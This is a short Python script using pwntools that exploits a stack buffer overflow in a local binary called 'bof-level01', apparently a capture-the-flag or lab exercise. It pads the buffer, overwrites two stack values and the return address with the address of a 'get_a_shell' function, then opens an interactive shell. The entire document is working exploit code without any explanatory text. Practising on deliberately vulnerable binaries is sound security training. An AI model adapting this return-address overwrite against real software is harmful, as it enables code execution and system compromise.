from pwn import *

elf = ELF("./bof-level01")
get_shell_addr = p64(elf.symbols["get_a_shell"])

a = 0x4847464544434241
b = 0x6867666564636261

buf_len = 0x40 - 0x10

message = (buf_len) * b"A" + p64(b) + p64(a)  + get_shell_addr

p = process("./bof-level01")
p.sendline(message)
p.interactive()

